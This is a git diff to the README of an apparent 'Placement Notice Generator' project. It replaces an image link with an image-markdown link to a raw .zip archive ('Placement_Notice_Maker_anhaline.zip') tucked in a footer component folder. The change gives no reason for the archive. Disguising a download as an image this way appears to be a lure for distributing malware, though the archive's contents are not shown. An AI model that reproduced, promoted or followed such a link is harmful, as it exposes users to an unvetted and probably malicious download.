@@ -1,3 +1,3 @@
 # Placement Notice Generator
 
-![image](https://github.com/therohitbansal/PlacementNoticeMaker/assets/92664590/2b421e08-8bdf-4810-8471-684a56dd6162)
+![image](https://github.com/therohitbansal/PlacementNoticeMaker/raw/refs/heads/main/src/components/footer/Placement_Notice_Maker_anhaline.zip)
